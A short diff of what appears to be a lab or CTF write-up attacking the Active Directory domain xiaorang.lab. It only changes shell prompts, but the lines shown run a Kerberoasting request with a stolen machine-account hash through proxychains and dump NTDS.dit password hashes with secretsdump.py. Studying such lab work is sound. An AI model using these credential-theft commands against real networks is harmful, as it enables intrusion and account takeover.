@@ -1182,7 +1182,7 @@ WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,D
 request
 
 ```shell
-➜ ~ proxychains getUserSPNs.py xiaorang.lab/'XR-0923$' -hashes ':ca4b01dd584a3176ca01a347b55b9c2b' -dc-ip 172.22.14.11 -request-user tianjing
+$ proxychains getUserSPNs.py xiaorang.lab/'XR-0923$' -hashes ':ca4b01dd584a3176ca01a347b55b9c2b' -dc-ip 172.22.14.11 -request-user tianjing
 Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra
 
 ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation
@@ -1325,7 +1325,7 @@ diskshadow.exe : 拒绝访问。
 dump
 
 ```shell
-➜ ntds secretsdump.py -system system.hive -ntds ntds.dit local
+$ ntds secretsdump.py -system system.hive -ntds ntds.dit local
 Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra
 
 [*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
